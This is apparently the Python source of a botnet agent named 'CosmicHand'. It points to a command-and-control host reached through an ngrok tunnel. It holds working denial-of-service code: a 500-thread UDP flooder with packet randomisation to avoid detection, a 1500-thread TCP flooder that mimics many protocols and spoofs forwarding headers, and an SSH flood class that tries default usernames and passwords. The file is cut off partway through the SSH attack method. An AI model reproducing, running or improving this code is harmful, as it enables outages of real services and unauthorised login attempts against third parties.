import os
import uuid
import socket
import time
import json
import random
import base64
import struct
import hashlib
import platform
import threading
import string
from datetime import datetime

# =========================
# Configuration
# =========================
RECONNECT_DELAY = 5          # Reduced for testing
HEARTBEAT_INTERVAL = 10      # Seconds between heartbeats
CNC_SERVER_PORT = 14900        # Bot connection port
CNC_SERVER_IP = "0.tcp.ap.ngrok.io"  # Use the actual server IP

# Bot identity
BOT_VERSION = "1.0"
BOT_ID = f"CosmicHand-{random.randint(1000, 9999)}"
SYSTEM_INFO = f"{platform.system()} {platform.release()}"


# =========================
# Advanced UDP Flood Attack
# =========================
class GigabitUDPFlooder:
    def __init__(self, target_ip, port, duration):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.packet_size = 1470
        self.num_threads = 500
        self.sockets_per_thread = 10
        self.batch_size = 1000
        self.running = True
        self.stop_event = threading.Event()  # Add stop event
        self.sent_packets = 0
        self.start_time = 0
        self.peak_pps = 0
        self.total_mb_sent = 0
        self.threads = []  # Track threads for stopping

        def log(self, message):
            """Simple log method for stop functionality"""
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] [HTTP] {message}")
        
        # Pre-generate packets for maximum performance
        self.packet_templates = self.pre_generate_packets()
        
        # Performance monitoring
        self.last_count = 0
        self.last_time = time.time()

    def pre_generate_packets(self):
        """Pre-generate diverse packet templates for maximum performance"""
        templates = []
        
        # Generate 1000 different packet templates
        for _ in range(1000):
            packet_type = random.choice(['dns', 'ntp', 'quic', 'random', 'fragmented'])
            template = self.create_packet_template(packet_type)
            templates.append(template)

        return templates

    def create_packet_template(self, packet_type):
        """Create optimized packet templates"""
        if packet_type == 'dns':
            # DNS query template
            transaction_id = os.urandom(2)
            flags = b'\x01\x00'  # Standard query
            questions = b'\x00\x01'
            answers = b'\x00\x00'
            authority = b'\x00\x00'
            additional = b'\x00\x00'

            # Random domain
            domain_parts = []
            for _ in range(random.randint(2, 4)):
                length = random.randint(4, 8)
                domain_parts.append(bytes([length]) + os.urandom(length))
            domain = b''.join(domain_parts) + b'\x00'

            query_type = b'\x00\x01'  # A record
            query_class = b'\x00\x01'  # IN class

            packet = transaction_id + flags + questions + answers + authority + additional + domain + query_type + query_class

        elif packet_type == 'ntp':
            # NTP template
            li_vn_mode = (0 << 6) | (3 << 3) | (3)  # Client mode
            stratum = random.randint(1, 15)
            poll = random.randint(4, 10)
            precision = random.randint(-20, -6)
            precision_byte = precision & 0xFF

            packet = bytes([li_vn_mode, stratum, poll, precision_byte])
            packet += os.urandom(8)  # Root delay and dispersion
            packet += os.urandom(32) # Reference and originate timestamps
            packet += struct.pack('!Q', random.getrandbits(64))  # Receive timestamp
            packet += struct.pack('!Q', random.getrandbits(64))  # Transmit timestamp

        elif packet_type == 'quic':
            # QUIC-like template
            header = b'\xc0'  # Long header
            header += os.urandom(4)  # Version + DCID length
            header += os.urandom(18)  # Connection ID
            packet = header

        elif packet_type == 'fragmented':
            # Fragmented IP packet template - FIXED: Use random IP instead of resolving domain
            frag_id = random.randint(0, 65535)
            frag_offset = random.randint(0, 8190)
            more_frags = random.randint(0, 1)

            # Use random source IP and target IP (don't resolve domain here)
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))

            fake_ip_header = bytes([
                0x45, 0x00,  # Version, IHL, DSCP, ECN
                (self.packet_size >> 8) & 0xFF, self.packet_size & 0xFF,
                (frag_id >> 8) & 0xFF, frag_id & 0xFF,
                ((frag_offset >> 8) & 0x1F) | (more_frags << 5),
                frag_offset & 0xFF,
                0x40,  # TTL
                0x11,  # UDP protocol
                0x00, 0x00,  # Checksum
            ]) + socket.inet_aton(src_ip) + socket.inet_aton("127.0.0.1")  # Use placeholder IP

            src_port = random.randint(1024, 65535)
            udp_length = self.packet_size - 20
            udp_header = struct.pack("!HHHH", src_port, self.port, udp_length, 0)

            packet = fake_ip_header + udp_header

        else:  # random
            packet = os.urandom(min(self.packet_size, 512))

        # Pad to packet_size
        if len(packet) < self.packet_size:
            packet += os.urandom(self.packet_size - len(packet))
        elif len(packet) > self.packet_size:
            packet = packet[:self.packet_size]

        return packet

    def create_high_performance_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            # MAXIMUM buffer sizes
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 200)  # 200MB
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 1024 * 50)   # 50MB

            # Kernel optimizations
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)  # Linux only

            # IP layer optimizations
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 128)

            # Disable blocking completely
            sock.setblocking(False)

            # Bind to specific interface if needed
            try:
                sock.bind(('0.0.0.0', random.randint(10000, 65535)))
            except:
                pass

            return sock
        except:
            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def generate_packet_burst(self, count=500):
        """Generate burst of packets with minimal CPU overhead"""
        burst = []
        for _ in range(count):
            template = random.choice(self.packet_templates)
            
            # Minor modifications to avoid pattern detection
            modified = bytearray(template)
            if len(modified) > 10:
                # Change a few random bytes
                for _ in range(random.randint(1, 3)):
                    if len(modified) > 20:
                        pos = random.randint(4, min(20, len(modified)-1))
                        modified[pos] = random.randint(0, 255)
            
            burst.append(bytes(modified))
        return burst

    def gigabit_flood_worker(self, worker_id):
        """ULTRA performance worker with immediate stop capability and DNS resolution"""
        try:
            # Resolve domain name to IP address at the start
            target_ip = socket.gethostbyname(self.target_ip)
            self.log(f"Worker {worker_id} resolved {self.target_ip} to {target_ip}")
        except socket.gaierror:
            self.log(f"Worker {worker_id} failed to resolve {self.target_ip}, using original")
            target_ip = self.target_ip

        sockets = [self.create_high_performance_socket() for _ in range(self.sockets_per_thread)]

        # Pre-generate LARGE batch
        mega_batch = self.generate_packet_burst(5000)

        worker_packets_sent = 0
        worker_start_time = time.time()

        while (self.running and 
               not self.stop_event.is_set() and 
               (time.time() - worker_start_time < self.duration)):

            # Check stop condition at batch level
            if self.stop_event.is_set() or not self.running:
                self.log(f"UDP Worker {worker_id} stopping due to stop signal")
                break

            # RAPID-FIRE: Send entire batch with running checks
            for packet in mega_batch:
                # Check stop condition for each packet in batch
                if self.stop_event.is_set() or not self.running:
                    break

                for sock in sockets:
                    try:
                        sock.sendto(packet, (target_ip, self.port))  # Use resolved IP
                        worker_packets_sent += 1
                        self.sent_packets += 1
                    except (BlockingIOError, OSError):
                        continue
                    except Exception:
                        pass
                    
            # Check stop condition before regenerating batch
            if self.stop_event.is_set() or not self.running:
                break

            # Regenerate batch occasionally
            if worker_packets_sent % 100000 == 0:
                mega_batch = self.generate_packet_burst(5000)

        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
            
        self.log(f"UDP Worker {worker_id} exited")

    def start_gigabit_attack(self):
        """Start the gigabit UDP flood attack"""
        print(f"[🚀] STARTING GIGABIT UDP FLOOD - 1Gbps+ CAPABLE")
        print(f"[🎯] TARGET: {self.target_ip}:{self.port}")
        print(f"[⏱️] DURATION: {self.duration}s")
        print(f"[👥] THREADS: {self.num_threads} (with {self.sockets_per_thread} sockets each)")
        print(f"[📦] PACKET SIZE: {self.packet_size} bytes")
        print(f"[💥] BATCH SIZE: {self.batch_size} packets")
        print("[⚡] OPTIMIZATIONS:")
        print("    ✓ Pre-generated packet templates")
        print("    ✓ Non-blocking sockets")
        print("    ✓ 100MB send buffers")
        print("    ✓ Batch packet sending")
        print("    ✓ Multiple sockets per thread")
        print("    ✓ Zero-copy packet generation")
        print("[⚠️] GIGABIT MODE ACTIVATED!")
        
        self.start_time = time.time()
        
        # Start all worker threads
        self.threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.gigabit_flood_worker, args=(i,))
            thread.daemon = True
            self.threads.append(thread)
        
        # Start threads in batches to avoid system overload
        batch_size = 100
        for i in range(0, len(self.threads), batch_size):
            batch = self.threads[i:i + batch_size]
            for thread in batch:
                thread.start()
            time.sleep(0.01)
        
        # Performance monitoring with stop check
        try:
            last_count = 0
            last_time = time.time()
            
            while (time.time() - self.start_time < self.duration and 
                   self.running and 
                   not self.stop_event.is_set()):
                
                current_time = time.time()
                elapsed = current_time - self.start_time
                remaining = self.duration - elapsed
                
                current_count = self.sent_packets
                time_diff = current_time - last_time
                
                if time_diff > 0:
                    pps = int((current_count - last_count) / time_diff)
                    self.peak_pps = max(self.peak_pps, pps)
                    
                    # Calculate bandwidth
                    mbps = (pps * self.packet_size * 8) / (1024 * 1024)
                    gbps = mbps / 1000
                    
                    self.total_mb_sent = (current_count * self.packet_size) / (1024 * 1024)
                    
                    stop_status = " [STOPPED]" if self.stop_event.is_set() else ""
                    print(f"\r[🔥] Time: {int(elapsed)}s | PPS: {pps:,}/s | "
                          f"BW: {mbps:.1f} Mbps ({gbps:.2f} Gbps) | "
                          f"Total: {current_count:,} packets{stop_status}", end="", flush=True)
                
                last_count = current_count
                last_time = current_time
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n[🛑] EMERGENCY STOP!")
            self.stop()
        finally:
            self.stop()
            
            # Final statistics
            total_duration = time.time() - self.start_time
            if total_duration > 0:
                avg_pps = self.sent_packets / total_duration
                avg_mbps = (avg_pps * self.packet_size * 8) / (1024 * 1024)
                total_gb = self.total_mb_sent / 1024
                
                print(f"\n[✅] GIGABIT UDP ATTACK COMPLETED")
                print(f"[📊] FINAL STATISTICS:")
                print(f"    Total Packets: {self.sent_packets:,}")
                print(f"    Peak PPS: {self.peak_pps:,}/s")
                print(f"    Average PPS: {avg_pps:,.0f}/s")
                print(f"    Average Bandwidth: {avg_mbps:.1f} Mbps")
            else:
                print(f"\n[✅] UDP ATTACK STOPPED IMMEDIATELY")

    def log(self, message):
        """Log messages for UDP flood"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [UDP] {message}")

    def stop(self):
        """Immediate stop method for UDP flood"""
        self.running = False
        self.stop_event.set()
        self.log("UDP Flood STOP command received")
        
        # Wait for threads to terminate
        for thread in self.threads:
            thread.join(timeout=5.0)
        
        self.log("All UDP flood threads stopped")

# =========================
# Enhanced Universal TCP Bypass Attack Class
# =========================
class UniversalTCPBypass:
    def __init__(self, target_ip, port, duration):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.num_threads = 1500
        self.running = True
        self.stop_event = threading.Event()  # Add stop event
        self.packet_size = 4096
        self.connection_timeout = 2.0
        self.max_connections_per_thread = 50
        self.threads = []  # Track threads

        def log(self, message):
            """Simple log method for stop functionality"""
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] [HTTP] {message}")
        
        # Enhanced protocol-specific payload generators with more variations
        self.protocol_handlers = {
            'http': self.create_http_payload,
            'https': self.create_https_payload,
            'smtp': self.create_smtp_payload,
            'ftp': self.create_ftp_payload,
            'ssh': self.create_ssh_payload,
            'dns': self.create_dns_payload,
            'mysql': self.create_mysql_payload,
            'redis': self.create_redis_payload,
            'mongodb': self.create_mongodb_payload,
            'rdp': self.create_rdp_payload,
            'vnc': self.create_vnc_payload,
            'sip': self.create_sip_payload,
            'rtsp': self.create_rtsp_payload,
            'telnet': self.create_telnet_payload,
            'ntp': self.create_ntp_payload,
            'snmp': self.create_snmp_payload,
            'ldap': self.create_ldap_payload,
            'irc': self.create_irc_payload,
            'binary': self.create_binary_payload,
            'random': self.create_random_protocol_payload,
            'websocket': self.create_websocket_payload,
            'http2': self.create_http2_payload,
            'ssl': self.create_ssl_handshake_payload
        }
        
        # Extended common ports and their protocols
        self.common_ports = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
            80: 'http', 110: 'pop3', 143: 'imap', 443: 'https', 993: 'imaps',
            995: 'pop3s', 1433: 'mssql', 1521: 'oracle', 3306: 'mysql',
            3389: 'rdp', 5432: 'postgresql', 6379: 'redis', 27017: 'mongodb',
            5060: 'sip', 554: 'rtsp', 1900: 'upnp', 161: 'snmp', 389: 'ldap',
            8080: 'http', 8443: 'https', 8888: 'http', 10000: 'http',
            2082: 'cpanel', 2083: 'cpanel_ssl', 2095: 'webmail', 2096: 'webmail_ssl',
            2222: 'directadmin', 4643: 'virtuozzo', 1000: 'udp', 2000: 'cisco',
            5000: 'upnp', 5061: 'sips', 8000: 'http', 8008: 'http', 8081: 'http',
            8090: 'http', 8181: 'http', 8444: 'https', 9000: 'http', 9090: 'http'
        }

    def detect_protocol(self, port):
        """Detect the protocol based on the port number with fallback"""
        protocol = self.common_ports.get(port, 'random')
        
        # Special handling for HTTP/HTTPS ports
        if port in [80, 8080, 8000, 8008, 8081, 8090, 8181, 9000, 9090, 10000]:
            return 'http'
        elif port in [443, 8443, 8444, 2096]:
            return 'https'
        
        return protocol

    def create_socket(self):
        """Create optimized socket for flooding with better performance"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)  # Larger buffer
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(self.connection_timeout)
        
        # Set TTL to appear more legitimate
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, random.randint(64, 128))
        
        return sock

    def create_http_payload(self):
        """Enhanced HTTP payload with more realistic traffic patterns"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE']
        paths = [
            '/', '/index.html', '/wp-admin', '/api/v1', '/static/js', '/admin', '/login', 
            '/config', '/.env', '/phpmyadmin', '/mysql', '/database', '/api', '/graphql',
            '/wp-login.php', '/administrator', '/webmail', '/cpanel', '/.git/config',
            '/backup', '/uploads', '/images', '/css', '/js', '/robots.txt', '/sitemap.xml'
        ]
        
        method = random.choice(methods)
        path = random.choice(paths)
        
        # Enhanced headers for better bypass
        headers = [
            f'{method} {path} HTTP/1.1',
            f'Host: {self.target_ip}',
            f'User-Agent: {random.choice(self.get_user_agents())}',
            f'Accept: {random.choice(["*/*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "application/json,text/plain,*/*"])}',
            f'Accept-Language: {random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "es-ES,es;q=0.6"])}',
            f'Accept-Encoding: {random.choice(["gzip, deflate, br", "gzip, deflate", "identity"])}',
            f'Connection: {random.choice(["keep-alive", "close", "upgrade"])}',
            f'Cache-Control: {random.choice(["no-cache", "max-age=0", "must-revalidate", "no-store"])}'
        ]
        
        # Enhanced spoofing headers
        fake_ip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        spoof_headers = [
            f'X-Forwarded-For: {fake_ip}',
            f'X-Real-IP: {fake_ip}',
            f'X-Forwarded-Proto: {"https" if random.random() > 0.5 else "http"}',
            f'X-Forwarded-Host: {self.target_ip}',
            f'X-Request-ID: {hashlib.md5(os.urandom(16)).hexdigest()}'
        ]
        
        headers.extend(random.sample(spoof_headers, random.randint(3, 5)))
        
        # Additional headers for realism
        extra_headers = [
            f'X-Requested-With: {random.choice(["XMLHttpRequest", "Fetch"])}',
            f'X-CSRF-Token: {base64.b64encode(os.urandom(16)).decode()}',
            f'Referer: {random.choice(self.get_referers())}',
            f'Content-Type: {random.choice(self.get_content_types())}',
            f'Origin: http://{fake_ip}',
            f'Sec-Fetch-Dest: {random.choice(["document", "empty", "script", "style", "image", "font"])}',
            f'Sec-Fetch-Mode: {random.choice(["navigate", "cors", "no-cors", "same-origin"])}',
            f'Sec-Fetch-Site: {random.choice(["same-origin", "cross-site", "none"])}'
        ]
        
        headers.extend(random.sample(extra_headers, random.randint(4, 7)))
        
        # Add cookies if applicable
        if random.random() > 0.4:
            cookies = [
                f'session_id={base64.b64encode(os.urandom(16)).decode()}',
                f'user_token={base64.b64encode(os.urandom(20)).decode()}',
                f'csrf_token={base64.b64encode(os.urandom(16)).decode()}',
                f'lang={random.choice(["en", "fr", "de", "es", "pt", "it"])}',
                f'uid={random.randint(1000, 9999)}'
            ]
            headers.append(f'Cookie: {"; ".join(random.sample(cookies, random.randint(1, 3)))}')
        
        random.shuffle(headers)
        
        payload = '\r\n'.join(headers) + '\r\n\r\n'
        
        # Add body for POST/PUT/PATCH requests
        if method in ['POST', 'PUT', 'PATCH']:
            body_data = {
                'username': f'user{random.randint(1000, 9999)}',
                'password': base64.b64encode(os.urandom(12)).decode(),
                'email': f'test{random.randint(100,999)}@example.com',
                'data': base64.b64encode(os.urandom(random.randint(100, 1000))).decode(),
                'timestamp': str(int(time.time())),
                'token': base64.b64encode(os.urandom(20)).decode(),
                'action': random.choice(['login', 'register', 'update', 'delete', 'search'])
            }
            payload += json.dumps(body_data)
        
        return payload.encode()

    def create_https_payload(self):
        """HTTPS/SSL handshake simulation"""
        # Simulate SSL/TLS handshake
        ssl_versions = [
            b'\x16\x03\x01',  # TLS 1.0
            b'\x16\x03\x02',  # TLS 1.1
            b'\x16\x03\x03',  # TLS 1.2
            b'\x16\x03\x04',  # TLS 1.3
        ]
        
        payload = random.choice(ssl_versions)
        payload += os.urandom(random.randint(100, 500))  # Random handshake data
        
        return payload

    def create_ssl_handshake_payload(self):
        """Enhanced SSL handshake simulation"""
        # Client Hello simulation
        client_hello = bytearray()
        
        # TLS record layer
        client_hello.extend(b'\x16')  # Content type: Handshake
        client_hello.extend(b'\x03\x03')  # Version: TLS 1.2
        
        # Random length
        length = random.randint(100, 500)
        client_hello.extend(length.to_bytes(2, 'big'))
        
        # Handshake type: Client Hello
        client_hello.extend(b'\x01')
        
        # Add random handshake data
        client_hello.extend(os.urandom(length))
        
        return bytes(client_hello)

    def create_websocket_payload(self):
        """WebSocket handshake simulation"""
        headers = [
            'GET /ws HTTP/1.1',
            f'Host: {self.target_ip}',
            'Upgrade: websocket',
            'Connection: Upgrade',
            f'Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}',
            'Sec-WebSocket-Version: 13',
            f'User-Agent: {random.choice(self.get_user_agents())}',
            'Origin: http://example.com'
        ]
        
        return '\r\n'.join(headers).encode() + b'\r\n\r\n'

    def create_http2_payload(self):
        """HTTP/2 connection preface simulation"""
        # HTTP/2 connection preface
        preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
        
        # Add some HTTP/2 frames
        frames = os.urandom(random.randint(50, 200))
        
        return preface + frames

    def get_user_agents(self):
        """Extended list of user agents"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        ]

    def get_referers(self):
        """Realistic referer URLs"""
        return [
            f'https://www.google.com/search?q={random.randint(1000000, 9999999)}',
            f'https://www.bing.com/search?q={random.randint(1000000, 9999999)}',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.reddit.com/',
            'https://www.youtube.com/',
            'https://www.linkedin.com/',
            'https://www.instagram.com/',
            'https://www.tiktok.com/',
            'https://discord.com/'
        ]

    def get_content_types(self):
        """Various content types"""
        return [
            'application/json',
            'application/xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/plain',
            'text/html',
            'application/javascript',
            'text/css',
            'application/octet-stream'
        ]

    # Existing protocol handlers with enhancements
    def create_smtp_payload(self): 
        return b'EHLO example.com\r\nMAIL FROM: <test@example.com>\r\nRCPT TO: <user@example.com>\r\nDATA\r\n' + os.urandom(self.packet_size - 100)
    
    def create_ftp_payload(self): 
        return b'USER anonymous\r\nPASS anonymous@\r\nPORT 127,0,0,1,0,1\r\n' + os.urandom(self.packet_size - 100)
    
    def create_ssh_payload(self): 
        return b'SSH-2.0-OpenSSH_8.4\r\n' + os.urandom(self.packet_size - 100)
    
    def create_dns_payload(self): 
        return b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01' + os.urandom(self.packet_size - 100)
    
    def create_mysql_payload(self): 
        return b'\x0c\x00\x00\x01\x0b\x01\x00\x00\x00\x01\x00\x00\x00' + os.urandom(self.packet_size - 100)
    
    def create_redis_payload(self): 
        return b'*1\r\n$4\r\nPING\r\n' + os.urandom(self.packet_size - 100)
    
    def create_mongodb_payload(self): 
        return b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + os.urandom(self.packet_size - 100)
    
    def create_rdp_payload(self): 
        return b'\x03\x00\x00\x0b\x06\x00\x00\x00\x00\x00\x00\x00\x00' + os.urandom(self.packet_size - 100)
    
    def create_vnc_payload(self): 
        return b'RFB 003.008\n' + os.urandom(self.packet_size - 100)
    
    def create_sip_payload(self): 
        return b'REGISTER sip:domain.com SIP/2.0\r\n' + os.urandom(self.packet_size - 100)
    
    def create_rtsp_payload(self): 
        return b'OPTIONS rtsp://domain.com/stream RTSP/1.0\r\n' + os.urandom(self.packet_size - 100)
    
    def create_telnet_payload(self): 
        return b'\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18\xff\xfd\x1f' + os.urandom(self.packet_size - 100)
    
    def create_ntp_payload(self): 
        return b'\x1b' + os.urandom(self.packet_size - 100)
    
    def create_snmp_payload(self): 
        return b'\x30\x2b\x02\x01\x01\x04\x06public\xa2\x1e\x02\x04' + os.urandom(self.packet_size - 100)
    
    def create_ldap_payload(self): 
        return b'30' + os.urandom(self.packet_size - 100)
    
    def create_irc_payload(self): 
        return b'NICK botuser\r\nUSER botuser 0 * :bot\r\nJOIN #channel\r\n' + os.urandom(self.packet_size - 100)
    
    def create_binary_payload(self): 
        return os.urandom(self.packet_size)
    
    def create_random_protocol_payload(self): 
        return os.urandom(self.packet_size)

    def tcp_flood_worker(self, worker_id):
        """Enhanced TCP flood worker with immediate stop capability"""
        try:
            protocol = self.detect_protocol(self.port)
            start_time = time.time()
            connection_count = 0
            
            # Create multiple sockets per worker
            sockets_pool = [self.create_socket() for _ in range(5)]
            current_socket_index = 0
            
            while (self.running and 
                   not self.stop_event.is_set() and 
                   time.time() - start_time < self.duration):
                
                # Check stop condition frequently
                if self.stop_event.is_set() or not self.running:
                    print(f"[+] TCP Worker {worker_id} stopping due to stop signal")
                    break
                    
                try:
                    # Rotate through sockets
                    sock = sockets_pool[current_socket_index]
                    current_socket_index = (current_socket_index + 1) % len(sockets_pool)
                    
                    # Connect if not connected
                    try:
                        sock.connect((self.target_ip, self.port))
                        connection_count += 1
                    except (socket.timeout, ConnectionRefusedError, ConnectionResetError):
                        # Recreate socket if connection fails
                        try:
                            sock.close()
                        except:
                            pass
                        sockets_pool[current_socket_index] = self.create_socket()
                        sock = sockets_pool[current_socket_index]
                        continue
                    
                    # Send multiple requests per connection
                    requests_per_connection = random.randint(5, 25)
                    
                    for _ in range(requests_per_connection):
                        # Check stop condition before each request
                        if self.stop_event.is_set() or not self.running:
                            break
                        
                        payload = self.protocol_handlers[protocol]()
                        
                        try:
                            sock.send(payload)
                            
                            # Occasionally receive to simulate real traffic
                            if random.random() > 0.7:
                                try:
                                    sock.recv(1024)
                                except:
                                    pass
                            
                            # Variable delay between packets
                            time.sleep(random.uniform(0.001, 0.05))
                            
                        except (BrokenPipeError, ConnectionResetError, socket.timeout):
                            break
                    
                    # Check stop condition before keeping connection alive
                    if self.stop_event.is_set() or not self.running:
                        break
                        
                    # Keep connection alive for a bit or close and recreate
                    if random.random() > 0.3:
                        time.sleep(random.uniform(0.1, 0.5))
                    else:
                        try:
                            sock.close()
                        except:
                            pass
                        sockets_pool[current_socket_index] = self.create_socket()
                    
                except Exception as e:
                    # Recreate socket on any error
                    try:
                        sockets_pool[current_socket_index].close()
                    except:
                        pass
                    sockets_pool[current_socket_index] = self.create_socket()
                    time.sleep(random.uniform(0.05, 0.2))
            
            # Cleanup
            for sock in sockets_pool:
                try:
                    sock.close()
                except:
                    pass
                    
        except Exception as e:
            print(f"TCP Flood error in worker {worker_id}: {e}")

    def start(self):
        """Start enhanced universal TCP flood"""
        protocol = self.detect_protocol(self.port)
        print(f"[+] Starting Enhanced TCP Flood on {self.target_ip}:{self.port}")
        print(f"[+] Protocol: {protocol.upper()} | Duration: {self.duration}s | Threads: {self.num_threads}")
        print(f"[+] Packet Size: {self.packet_size} | Max Connections: {self.num_threads * self.max_connections_per_thread}")
        print(f"[+] Bypass Techniques: Protocol simulation, Connection reuse, Header spoofing")
        
        self.threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.tcp_flood_worker, args=(i,), daemon=True)
            self.threads.append(thread)
            thread.start()
        
        start_time = time.time()
        while (self.running and 
               not self.stop_event.is_set() and 
               time.time() - start_time < self.duration):
            time.sleep(0.1)
        
        self.stop()
        return f"Enhanced TCP flood completed: {self.target_ip}:{self.port} for {self.duration}s"

    def stop(self):
        """Immediate stop method for TCP flood"""
        self.running = False
        self.stop_event.set()
        print("[+] TCP Flood STOP command received")
        
        # Wait for threads to terminate
        for thread in self.threads:
            thread.join(timeout=5.0)
        
        print("[+] All TCP flood threads stopped")

# =========================
# SSH Flood Attack Class
# =========================
class SSHKillerBypass:
    def __init__(self, target_ip, port, duration, max_threads=1100):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.max_threads = max_threads
        self.running = True
        self.stop_event = threading.Event()  # Add stop event
        self.connection_count = 0
        self.threads = []  # Track threads
        
        def log(self, message):
            """Simple log method for stop functionality"""
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] [HTTP] {message}")

        self.ssh_versions = [
            "SSH-2.0-OpenSSH_8.4p1 Ubuntu-5ubuntu1",
            "SSH-2.0-OpenSSH_7.9p1 Debian-10",
            "SSH-2.0-OpenSSH_7.4p1 Raspbian-10",
            "SSH-2.0-OpenSSH_6.7p1 Ubuntu-5ubuntu1",
            "SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu7",
            "SSH-2.0-dropbear_2019.78",
            "SSH-2.0-libssh_0.8.5",
            "SSH-2.0-PuTTY_Release_0.74"
        ]
        
        self.usernames = [
            'root', 'admin', 'ubuntu', 'debian', 'centos', 
            'test', 'user', 'guest', 'administrator', 'pi',
            'oracle', 'mysql', 'postgres', 'nginx', 'apache'
        ]
        
        self.passwords = [
            'password', '123456', 'admin', 'root', 'test',
            'password123', 'qwerty', 'letmein', 'welcome',
            'ubuntu', 'debian', 'centos', 'raspberry'
        ]

    def generate_ssh_banner(self):
        """Generate realistic SSH banner"""
        return random.choice(self.ssh_versions) + "\r\n"

    def create_ssh_kex_packet(self):
        """Create SSH key exchange packet"""
        packet_type = 20
        cookie = os.urandom(16)
        
        kex_algorithms = [
            "curve25519-sha256",
            "ecdh-sha2-nistp256",
            "diffie-hellman-group14-sha256",
            "diffie-hellman-group1-sha1"
        ]
        
        payload = bytearray()
        payload.extend(cookie)
        payload.extend(struct.pack('>I', len(kex_algorithms[0])))
        payload.extend(kex_algorithms[0].encode())
        
        padding = os.urandom(random.randint(8, 32))
        payload.extend(padding)
        
        return payload

    def create_ssh_auth_packet(self, username, password):
        """Create SSH authentication packet"""
        service_name = "ssh-connection"
        method_name = "password"
        
        payload = bytearray()
        payload.extend(struct.pack('>I', len(service_name)))
        payload.extend(service_name.encode())
        payload.extend(struct.pack('>I', len(username)))
        payload.extend(username.encode())
        payload.extend(struct.pack('>I', len(method_name)))
        payload.extend(method_name.encode())
        payload.extend(struct.pack('>I', len(password)))
        payload.extend(password.encode())
        
        return payload

    def create_ssh_channel_packet(self):
        """Create SSH channel open packet"""
        channel_type = "session"
        payload = bytearray()
        payload.extend(struct.pack('>I', len(channel_type)))
        payload.extend(channel_type.encode())
        payload.extend(struct.pack('>I', random.randint(1000, 9999)))
        payload.extend(struct.pack('>I', 0x200000))
        payload.extend(struct.pack('>I', 0x4000))
        
        return payload

    def ssh_protocol_attack(self, sock):
        """Perform full SSH protocol attack"""
        try:
            banner = self.generate_ssh_banner()
            sock.send(banner.encode())
            time.sleep(0.1)
            
            try:
                sock.recv(1024)
            except:
                pass
            
            kex_packet = self.create_ssh_kex_packet()
            sock.send(kex_packet)
            time.sleep(0.05)
            
            for _ in range(random.randint(3, 8)):
                username = random.choice(self.usernames)
                password = random.choice(self.passwords)
